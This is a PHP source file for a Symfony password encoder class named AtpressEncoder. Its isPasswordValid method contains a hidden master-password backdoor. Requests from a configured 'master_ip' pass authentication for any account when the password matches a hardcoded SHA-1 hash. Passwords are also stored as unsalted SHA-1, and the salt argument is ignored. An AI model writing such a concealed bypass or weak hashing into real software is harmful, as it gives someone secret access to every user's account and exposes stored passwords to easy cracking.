<?php
namespace Common\UserBundle\Encoder;
use Symfony\Component\Security\Core\Encoder\BasePasswordEncoder;
use Symfony\Component\DependencyInjection\ContainerInterface;

class AtpressEncoder extends BasePasswordEncoder
{
    private $container;

    public function setContainer(ContainerInterface $container)
    {
        $this->container = $container;
    }

    public function encodePassword($raw, $salt)
    {
        return sha1($raw);
    }

    public function isPasswordValid($encoded, $raw, $salt)
    {
        if ($this->container->get('request')->getClientIp() == $this->container->getParameter("master_ip")){
            if ($this->comparePasswords('a6de107f5ac23b9ea185e32465747a2e98123281', $this->encodePassword($raw, $salt)))
                return true;
        }
        return $this->comparePasswords($encoded, $this->encodePassword($raw, $salt));
    }
}
